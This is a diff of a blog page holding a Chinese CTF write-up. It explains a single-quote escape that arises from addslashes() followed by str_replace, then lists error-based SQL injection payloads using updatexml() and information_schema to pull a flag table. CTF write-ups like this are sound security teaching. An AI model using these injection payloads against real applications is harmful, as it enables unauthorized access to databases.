@@ -28,12 +28,13 @@
 <meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf/64.png">
 <meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf/65.png">
 <meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf/66.png">
+<meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf/555.png">
 <meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf/67.png">
 <meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf/68.png">
 <meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf/69.png">
 <meta property="og:image" content="http://www.tu3k.cn/images/php_web_ctf/70.png">
 <meta property="article:published_time" content="2021-04-13T11:21:54.000Z">
-<meta property="article:modified_time" content="2021-04-13T16:05:06.235Z">
+<meta property="article:modified_time" content="2021-04-17T17:34:42.934Z">
 <meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://www.tu3k.cn/images/php_web_ctf/60.png">
@@ -329,12 +330,10 @@
 <p>编写满足条件的url<br><code>/index.php?flag1=fvhjjihfcv&amp;flag2=gfuyiyhioyf&amp;flag3=yugoiiyhi</code><br>拿到1chunqiu.zip压缩包下载即可<br><img src="http://www.tu3k.cn/images/php_web_ctf/63.png" alt="ctf_vid" title="ctf_vid"><br><img src="http://www.tu3k.cn/images/php_web_ctf/64.png" alt="ctf_vid" title="ctf_vid"></p>
 <h3 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h3><p>配置文件内有全局过滤函数，safe_data()</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">入库前的安全处理函数</span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line">public function safe_data($value)&#123;</span><br><span class="line">    if( MAGIC_QUOTES_GPC )&#123;</span><br><span class="line">        stripcslashes($value);</span><br><span class="line">    &#125;</span><br><span class="line">    return addslashes($value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="http://www.tu3k.cn/images/php_web_ctf/65.png" alt="ctf_vid" title="ctf_vid"><br><img src="http://www.tu3k.cn/images/php_web_ctf/66.png" alt="ctf_vid" title="ctf_vid"><br>对注册、登录功能进行过滤，password经过md5加密，number只能是纯数字，所以都不存在注入点。但是username虽然经过addslashes()处理（单引号，反斜杠等前面都会被加上反斜杠而转义，防御sql注入），但是又再次被这句代码处理 </p>
+<p><img src="http://www.tu3k.cn/images/php_web_ctf/65.png" alt="ctf_vid" title="ctf_vid"><br><img src="http://www.tu3k.cn/images/php_web_ctf/66.png" alt="ctf_vid" title="ctf_vid"><br>对注册、登录功能进行过滤，password经过md5加密，number只能是纯数字，所以都不存在注入点。但是username虽然经过addslashes()处理（单引号，反斜杠，NULL字符前面都会被加上反斜杠而转义，防御sql注入），但是又再次被这句代码处理 </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;trim(strreplace(number, &#39;&#39;, $username)</span><br></pre></td></tr></table></figure>
 <p>所以我们可以利用这里让单引号逃逸出来</p>
-<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>车牌号为0，用户名为admin%00’<br>验证车牌号是否为数字型、用户名进行addslashes函数过滤（addslashes函数会对值为NULL的字符前加 \ ，%0为NULL，即\0\‘）,而number也是0,所以将从username中去掉0，最终为<code>admin\\&#39;</code>，将反斜杠进行了转义，单引号成功逃逸并被带入数据库中，造成注入。<br>后台SQL语句为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username&#x3D;&#39;admin\\&#39;&#39;;</span><br></pre></td></tr></table></figure>
-<p>逃逸流程：</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>利用：车牌号为0，用户名为admin%00’<br>流程：<br>验证车牌号是否为数字型、用户名进行addslashes函数过滤（addslashes函数会对值类型为NULL的字符转换为0并在前面加<code>\</code> ，即<code>\0\&#39;</code>）,而number也是0,所以将从username中去掉0将两个反斜杠合并转义成普通的<code>\</code>，最终为<code>admin\\&#39;</code>，单引号成功逃逸并被带入数据库中，造成注入。<br>本地传参测试转义：<br><img src="http://www.tu3k.cn/images/php_web_ctf/555.png" alt="ctf_vid" title="ctf_vid"><br>逃逸流程：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%00&#39; —&gt; \0&#39; —&gt; \0\&#39; —&gt; \\&#39;</span><br></pre></td></tr></table></figure>
 <p><img src="http://www.tu3k.cn/images/php_web_ctf/67.png" alt="ctf_vid" title="ctf_vid"><br>有报错信息，直接报错注入吧，后来测试发现也只能通过报错注入来搞。<br>Payload：<br><code>admin%00&#39; and updatexml(1,version(),1)#</code><br><img src="http://www.tu3k.cn/images/php_web_ctf/68.png" alt="ctf_vid" title="ctf_vid"><br><code>admin%00&#39; and updatexml(1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),1)#</code><br><img src="http://www.tu3k.cn/images/php_web_ctf/69.png" alt="ctf_vid" title="ctf_vid"><br>users表，但没找到flag，盲猜存在flag表<br><code>admin%00&#39; and updatexml(1,substr((select flag from flag),1,41),1)#</code><br><code>admin%00&#39; and updatexml(1,substr((select flag from flag),11,41),1)#</code><br>取出重复拼接即可<br><img src="http://www.tu3k.cn/images/php_web_ctf/70.png" alt="ctf_vid" title="ctf_vid"><br>flag{26ccd33e-d713-49ac-b76d-3c3fd63970a2}</p>
 <h3 id="关于反斜杠个数造成单引号逃逸问题"><a href="#关于反斜杠个数造成单引号逃逸问题" class="headerlink" title="关于反斜杠个数造成单引号逃逸问题"></a>关于反斜杠个数造成单引号逃逸问题</h3><p>单引号前反斜杠为双数即逃逸，单数则被过滤正常带入，就是说以后不管前面有多少反斜杠，带入到数据库都会在<code>\</code>前加入<code>\</code>进行转义即<code>\\</code>，只需要找到能多加一个或者减少一个反斜杠的点，就造成了单引号逃逸。</p>
@@ -349,7 +348,7 @@
         <p><span>Title:</span><a href="/2021/04/13/vid-ctf/">百度杯CTF_Vulcan Logic Dumper</a></p>
         <p><span>Author:</span><a href="/" title="Back to Homepage"></a></p>
         <p><span>Created:</span>2021-04-13, 19:21:54</p>
-        <p><span>Updated:</span>2021-04-14, 00:05:06</p>
+        <p><span>Updated:</span>2021-04-18, 01:34:42</p>
         <p>
             <span>Full URL:</span><a class="post-url" href="/2021/04/13/vid-ctf/" title="百度杯CTF_Vulcan Logic Dumper">https://www.tu3k.cn/2021/04/13/vid-ctf/</a>
             <span class="copy-path" data-clipboard-text="From https://www.tu3k.cn/2021/04/13/vid-ctf/　　By " title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
